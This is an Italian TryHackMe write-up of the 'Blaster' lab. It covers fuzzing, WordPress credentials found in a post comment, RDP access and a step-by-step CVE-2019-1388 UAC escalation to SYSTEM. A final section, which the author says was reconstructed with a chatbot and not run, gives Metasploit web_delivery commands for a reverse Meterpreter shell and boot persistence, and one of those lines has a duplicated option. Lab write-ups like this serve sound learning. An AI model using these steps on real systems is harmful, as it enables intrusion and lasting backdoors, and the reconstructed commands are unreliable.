---
layout: writeup
lang: it
permalink: /writeups/blaster/
title: "Blaster"
ref: blaster
date: 2026-08-01
bare: true
platform: THM
os: Windows Server 2016 (IIS 10.0 + WordPress)
difficulty: Easy
series: thm-windows
tags: [win, iis, wordpress, fuzzing, CVE-2019-1388, rdp]
txt: /writeups-files/blaster.txt
summary: "WordPress nascosto sotto /retro, credenziali nei commenti di un post, escalation a SYSTEM via CVE-2019-1388 sulla finestra UAC di hhupd.exe."
---

# Writeup — Blaster (TryHackMe)

OS: Windows Server 2016 (RetroWeb, IIS 10.0 + WordPress)
Difficoltà: Easy
Data: 27 agosto 2026

---

## Sommario

Macchina Windows non in dominio con IIS e RDP esposti. Sul webserver gira un'installazione wordpress nascosta, scoperta tramite fuzzing pesante dopo che un tentativo con wordlist leggera non aveva dato nulla. Dentro WordPress, incrociando homepage e post pubblicati, si recupera uno username (wade) e una password lasciata come promemoria nei commenti di un post (parzival). Con quelle credenziali si accede sia al pannello WordPress che via RDP, dove si trova la user flag. Sul desktop dell'utente è presente un eseguibile dimenticato, hhupd.exe, che porta a CVE-2019-1388: una escalation UAC basata su un abuso della finestra "informazioni sul certificato" di Internet Explorer, che permette di aprire cmd.exe come SYSTEM. Il Task 4 della room, incentrato su Metasploit (web delivery e persistence), non sono riuscito a completarlo da solo entro i tempi e l'ho ricostruito a tavolino con l'aiuto di fonti online e di un chatbot

Catena: nmap → IIS + RDP → fuzzing pesante → /retro (WordPress) → REST API + homepage → username wade → password parzival nei commenti di un post → login wp-admin + RDP → user.txt → hhupd.exe → CVE-2019-1388 → SYSTEM via Save As di Internet Explorer → root.txt → Metasploit web_delivery → Meterpreter → persistence.

---

## strumenti e metodologie aggiuntive

durante la sessione è stato utilizzato un llm: per recupero dettagli su CVE, interpretazione di output grezzi, suggerimenti su vettori inesplorati in caso di blocco e spiegazione dettagliata di concetti tecnici. l'esecuzione e le scelte operative erano mie. il writeup è stato scritto da me e successivamente ripulito con lo stesso strumento.

---

## Premessa

room a tratti lenta per colpa dell'infrastruttura: un fuzzing troppo aggressivo ha mandato in crash il target una volta, costringendo a un riavvio della lab machine, e xfreerdp non era disponibile sulla mia distro, cosa che ha richiesto l'installazione di Remmina via Flatpak solo per potermi collegare via RDP. la parte più delicata è stata CVE-2019-1388: la procedura corretta richiede pochissimi passaggi, ma io ho seguito una guida video su YouTube in parallelo a un chatbot e per un po' ho continuato a sbagliare l'ordine esatto delle azioni dentro Internet Explorer,perdendo più tempo del dovuto per un errore banale di sequenza. il Task 4, quello su Metasploit web delivery e persistence, non sono riuscito a portarlo a termine nei tempi della sessione: mi ero fermato al comando PowerShell generato da Metasploit senza eseguirlo sul target. la sezione relativa nel writeup è stata ricostruita dopo, appoggiandomi a fonti online e a un chatbot per la sintassi esatta dei comandi, senza un'esecuzione reale mia su quella macchina, lo scrivo esplicitamente perché è più onesto che presentarla come se l'avessi eseguita dal vivo.

---

## Fase 1 — Ricognizione

nmap -Pn -sC -sV 10.114.185.56

Risultato:

80/tcp   open  http          Microsoft IIS httpd 10.0
| http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=RetroWeb
Target_Name: RETROWEB
DNS_Computer_Name: RetroWeb
Product_Version: 10.0.14393

Solo due porte aperte: IIS su 80 e RDP su 3389. il certificato TLS del servizio RDP rivela già il nome host, RetroWeb

---

## Fase 2 — Fuzzing web (con il crash della macchina)

curl -s http://10.114.185.56 conferma il titolo generico "IIS Windows Server". provo fuzzing sulla webroot con wordlist leggera:

gobuster dir -u http://10.114.185.56 -w /usr/share/wordlists/dirb/common.txt

e in parallelo con dirb sulla mia macchina:

dirb http://10.114.185.153 /usr/share/dirb/wordlists/common.txt

DOWNLOADED: 4612 - FOUND: 0

nulla con la wordlist leggera. passo a big.txt:

dirb http://10.114.185.153 /usr/share/dirb/wordlists/big.txt

==> DIRECTORY: http://10.114.185.153/retro/
==> DIRECTORY: http://10.114.185.153/retro/wp-admin/
==> DIRECTORY: http://10.114.185.153/retro/wp-content/
==> DIRECTORY: http://10.114.185.153/retro/wp-includes/
(!) FATAL: Too many errors connecting to host

il dirb pesante ha mandato in crash il servizio: verifico con curl --max-time 5 -I http://10.114.185.153/retro/ e ottengo connection timed out. conferma definitiva con:

nmap -Pn -p80,3389 10.114.185.153
80/tcp   filtered http
3389/tcp filtered ms-wbt-server

entrambe le porte filtered, la macchina non risponde più. riavvio la lab machine e ricontrollo:

nmap -Pn -p80,3389 10.114.160.81
80/tcp   open http
3389/tcp open ms-wbt-server

di nuovo online. la struttura /retro/wp-admin/, /retro/wp-content/, /retro/wp-includes/ conferma un'installazione WordPress nascosta sotto quella directory.

---

## Fase 3 — Ricognizione WordPress

curl --max-time 5 -i http://10.114.160.81/retro/

HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/7.1.29
Link: <http://localhost/retro/index.php/wp-json/>; rel="https://api.w.org/"
<title>Retro Fanatics – Retro Games, Books, and Movies Lovers</title>

la conferma che /retro/ esiste e risponde 200 OK, che è WordPress, e la versione di PHP (7.1.29, piuttosto datata). il campo Link conferma esplicitamente la presenza della REST API di WordPress su /retro/index.php/wp-json/.

curl --max-time 10 -s http://10.114.149.248/retro/index.php/wp-json/ | jq > /tmp/wp-api.json
wc -c /tmp/wp-api.json
142739 /tmp/wp-api.json

140 KB di JSON, troppi da leggere a mano senza uno strumento dedicato. dal namespace wp/v2 emergono endpoint potenzialmente interessanti come /wp/v2/users, /wp/v2/posts, /wp/v2/pages, /wp/v2/media, /wp/v2/settings, /wp/v2/themes, ma senza sapere ancora cosa fosse davvero accessibile senza autenticazione, meglio non tirare a indovinare ed enumerare tutto alla cieca.

su questo punto vale una premessa: interrogare in modo estensivo la REST API di un sito WordPress reale senza autorizzazione esplicita è un'attività che rientra nel penetration testing non autorizzato, e può configurarsi come accesso abusivo a sistema informatico anche quando gli endpoint sono tecnicamente "pubblici". quello che ho fatto qui ha senso solo perché la macchina è un target di laboratorio pensato apposta per questo, con consenso esplicito della piattaforma. fuori da questo contesto la stessa attività andrebbe fatta solo con autorizzazione scritta, per evitare rischi legali e di esfiltrazione dati non voluta.

---

## Fase 4 — Recupero credenziali dai post

le istruzioni della room indirizzano chiaramente: prima trovare uno username navigando /retro, poi cercare una password nei post, dato che l'utente avrebbe avuto "difficoltà a fare login di recente". provo prima /wp/v2/posts via API, senza risultati utili. provo poi a cercare riferimenti ad autori direttamente nell'HTML della homepage:

curl --max-time 5 -s http://10.114.132.0/retro/ | grep -oE 'href="[^"]+"' | grep '/retro/' | head -30

dai permalink emerge ripetutamente /retro/index.php/author/wade/, username potenziale: wade. dalla stessa homepage recupero anche i permalink dei post pubblicati (Tron Arcade Cabinet, Zelda Hidden Fan Room, Pac-Man Walkthrough, Ready Player One, Hello World).

il server nel frattempo torna a rispondere in modo intermittente: le richieste dirette a permalink e endpoint API a volte restituiscono output vuoto, il solito comportamento instabile già visto con il crash precedente. apro quindi /retro direttamente dal browser per esplorare i post manualmente invece di insistere da terminale. nel post Ready Player One, Wade racconta di sbagliare spesso il nome del proprio avatar quando fa login, e nei commenti lascia questa nota a sé stesso:

Leaving myself a note here just in case I forget how to spell it: parzival

username: wade — password: parzival.

---

## Fase 5 — Accesso a WordPress

scorrendo il post fino in fondo trovo un link "LOG IN" che porta a /retro/wp-login.php, la pagina di login standard di WordPress. accedo con wade / parzival, caricamento molto lento ma l'accesso va a buon fine.

Prove concrete dell'accesso:

Dashboard WordPress, saluto "Howdy, Wade" in alto a destra
Accesso a /wp-admin/plugins.php con azioni disponibili: Activate | Deactivate | Update | Delete
4 plugin presenti, di cui 2 attivi e 2 inattivi, disattivabili liberamente
WordPress 5.7.2 running 90s Retro theme
6 Posts, 1 Comment nel pannello Activity

per verificare concretamente il livello di privilegio, creo un nuovo post da Add New Post: viene pubblicato correttamente e diventa subito raggiungibile su /retro/index.php/2026/08/27/new-post-by-torchiachristian/, conferma che Wade ha permessi di scrittura e pubblicazione, non solo accesso in lettura.

---

## Fase 6 — Accesso RDP e user flag

la room chiede esplicitamente di collegarsi via RDP con le stesse credenziali. provo xfreerdp:

xfreerdp /v:10.114.132.0 /u:wade /p:parzival

il comando non era realmente disponibile sulla mia distro, e freerdp2-x11 non risultava installabile tramite apt in quel momento. verifico che Flatpak fosse presente e installo un client grafico alternativo:

flatpak install flathub org.remmina.Remmina
flatpak run org.remmina.Remmina

da Remmina: seleziono protocollo RDP, inserisco l'IP del target, accetto il certificato mostrato, inserisco wade / parzival (dominio vuoto). la connessione si apre come una sessione desktop remota completa, login automatico come Wade

sul desktop remoto trovo un solo file utile, user.txt:

THM{HACK_PLAYER_ONE}

esplorando il resto del filesystem: C:\Users\Wade\Downloads è vuoto, mentre sul Desktop, oltre alla flag, c'è un eseguibile dimenticato, hhupd.exe (715 KB, descritto come Microsoft HTML Help Control). controllo i permessi NTFS: SYSTEM, Wade e Administrators hanno Full Control, ereditati dalla cartella Users\Wade, informazione che di per sé non spiega ancora nulla, ma è il file che la room indica esplicitamente da investigare.

---

## Fase 7 — Identificazione della CVE

da PowerShell recupero i metadati del binario:

(Get-Item "$env:USERPROFILE\Desktop\hhupd.exe").VersionInfo | Format-List *

FileVersionRaw     : 4.71.1015.0
ProductName        : HTML Help 1.31 Update
FileDescription    : Microsoft® HTML Help Control
OriginalFilename   : hhupd.exe

ho sottoposto queste specifiche a un chatbot orientato alla security per correlarle a una vulnerabilità nota, dato che da solo non avrei saputo riconoscere il binario come vettore di attacco. è emersa CVE-2019-1388, coerente con l'eseguibile segnalato dalla room: una escalation di privilegi che sfrutta il comportamento della finestra UAC mostrata quando si avvia hhupd.exe, non i dettagli crittografici del certificato in sé (public key, thumbprint, issuer) ma il fatto che quella finestra permette di aprire altri programmi in un contesto già privilegiato.

---

## Fase 8 — Exploitation di CVE-2019-1388 (con tutti i fallimenti)

avvio hhupd.exe, appare la richiesta UAC di credenziali amministratore. clicco su "Show information about the publisher's certificate", si aprono i dettagli del certificato Microsoft firmato da VeriSign. clicco sul link dell'issuer (VeriSign Commercial Software Publishers CA): si apre Internet Explorer, che però mostra una pagina di errore perché la macchina non ha connessione a Internet.

da qui parte una serie di tentativi falliti prima di trovare la sequenza giusta:

Tentativo 1 — Save As dalla finestra sbagliata
provo Save As direttamente, ma la finestra si apre in un percorso inesistente (config\systemprofile\Desktop) e dà errore.

Tentativo 2 — Barra indirizzo di Internet Explorer
scrivo C:\Windows\System32 nella barra indirizzo di IE: il controllo passa a Esplora File, perdendo sia le opzioni Save As sia la barra menu di IE.

Tentativo 3 — Apertura diretta di cmd.exe da Esplora File
una volta dentro Esplora File, apro cmd.exe direttamente: si apre come utente wade, non come amministratore. inutile ai fini dell'escalation.

Tentativo 4 — File → Save As dentro Esplora File
l'opzione Save As non esiste in quel contesto, solo "Open new window", "Open command prompt" e simili.

Soluzione:
premo Alt per mostrare la barra menu su Internet Explorer (ancora sulla pagina di errore, non su Esplora File), clicco File → Save As, e nella barra indirizzo della finestra Save As, non nel campo "nome file", scrivo direttamente il percorso completo:

C:\Windows\System32\cmd.exe

premo invio. il file viene aperto direttamente come NT AUTHORITY\SYSTEM, perché Internet Explorer era stato lanciato dalla finestra UAC di hhupd.exe e ne eredita i privilegi.

C:\Windows\System32>whoami
nt authority\system

C:\Windows\System32>cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop>dir
04/23/2020  10:34 AM         31 root.txt

C:\Users\Administrator\Desktop>type root.txt
THM{COIN_OPERATED_EXPLOITATION}

shell SYSTEM confermata, root flag recuperata.

---

## Fase 9 — Task 4: Metasploit web delivery e persistence

questa parte, come scritto in premessa, non l'ho eseguita dal vivo sul target entro i tempi della sessione: mi ero fermato subito dopo la generazione del comando PowerShell da parte di Metasploit. la ricostruisco qui basandomi sulla sintassi corretta dei comandi, verificata con fonti online e un chatbot.

sulla macchina attacker:

msfconsole
use exploit/multi/script/web_delivery
set target 2
set payload windows/meterpreter/reverse_http
set LHOST 10.10.15.17
set SRVPORT 8080
set LPORT 4444
run -j

il modulo genera un comando PowerShell offuscato in base64 da eseguire sul target, che punta al server web temporaneo di Metasploit sulla porta 8080. eseguendolo sulla shell SYSTEM già ottenuta con l'exploit precedente, il target scarica lo stage e apre una sessione Meterpreter in reverse HTTP verso l'attacker:

[*] Meterpreter session 1 opened (10.10.15.17:4444 -> 10.112.168.127:49175)

sessions -i 1
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

per la persistenza, il comando che imposta un avvio automatico al boot è:

run persistence -X

con le opzioni complete:

run persistence -X -p windows/meterpreter/reverse_http -r 10.10.15.17 -p 4444

[+] Persistent agent installed. It will run on boot.

per testare che la persistenza funzioni davvero servirebbe un listener sempre in ascolto sulla macchina attacker (exploit/multi/handler con lo stesso payload e LHOST/LPORT), pronto a ricevere la connessione al riavvio del target, passaggio che in un ambiente reale richiede un servizio permanente lato attacker, non solo una sessione interattiva di msfconsole.

---

## Catena completa

nmap → IIS 80 + RDP 3389, hostname RetroWeb
→ fuzzing leggero senza risultati → fuzzing pesante → crash macchina → riavvio
→ /retro scoperto → WordPress + REST API confermati
→ homepage: username wade via /author/wade/
→ post Ready Player One: password parzival nei commenti
→ login wp-admin come wade → privilegi di scrittura confermati
→ RDP con Remmina (xfreerdp non disponibile) → user.txt
→ hhupd.exe sul desktop → CVE-2019-1388 identificata
→ escalation UAC via Save As di Internet Explorer → SYSTEM → root.txt
→ Metasploit web_delivery → Meterpreter reverse HTTP → persistence al boot

---

## Lezioni apprese

quando un fuzzing con wordlist pesante manda in crash un target instabile, conviene passare subito a una wordlist più piccola e mirata invece di insistere, e verificare con un ping/port scan leggero se il servizio è ancora vivo prima di continuare a lanciare richieste a vuoto.

le istruzioni della room, quando presenti, vanno lette per intero prima di esplorare a caso una superficie ampia come una REST API WordPress: la stessa domanda ("il tuo utente ha avuto problemi di login recentemente") era già una mappa diretta verso dove cercare la password, senza bisogno di enumerare ogni endpoint disponibile.

in una escalation basata su una finestra di sistema privilegiata (come la UAC di hhupd.exe), il dettaglio che conta non è il contenuto tecnico mostrato (certificato, chiave pubblica, hash) ma il contesto di privilegio in cui quella finestra gira, e quali altre azioni permette di lanciare da lì dentro

---

## Tool utilizzati

nmap, dirb, gobuster, curl, jq, Remmina (via Flatpak), PowerShell, Internet Explorer (come vettore dell'exploit), msfconsole (exploit/multi/script/web_delivery, exploit/multi/handler)
